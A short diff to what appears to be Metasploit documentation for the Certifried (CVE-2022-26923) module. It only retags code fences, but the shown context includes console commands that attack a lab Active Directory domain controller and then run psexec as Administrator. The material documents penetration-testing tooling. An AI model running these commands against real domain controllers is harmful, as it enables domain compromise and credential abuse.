@@ -123,7 +123,7 @@ user set in the `IMPERSONATE` option (default is `Administrator`).
 ## Scenarios
 
 ### Windows Server 2019 Domain Controller with ADCS installed
-```
+```msf
 msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > run verbose=true rhosts=192.168.100.104 username=Test password=123456 domain=mylab.local dc_name=DC02 ca=mylab-DC02-CA
 [*] Running module against 192.168.100.104
 
@@ -191,7 +191,7 @@ host             service  type                 name             content         
 ```
 
 ### Using `psexec` with the TGS impersonating the Administrator
-```
+```msf
 msf6 exploit(windows/smb/psexec) > exploit rhosts=192.168.100.104 lhost=192.168.100.1 smbuser=administrator smbdomain=mylab.local Smb::Auth=kerberos Smb::Rhostname=dc02.mylab.local DomainControllerRhost=192.168.100.104
 
 
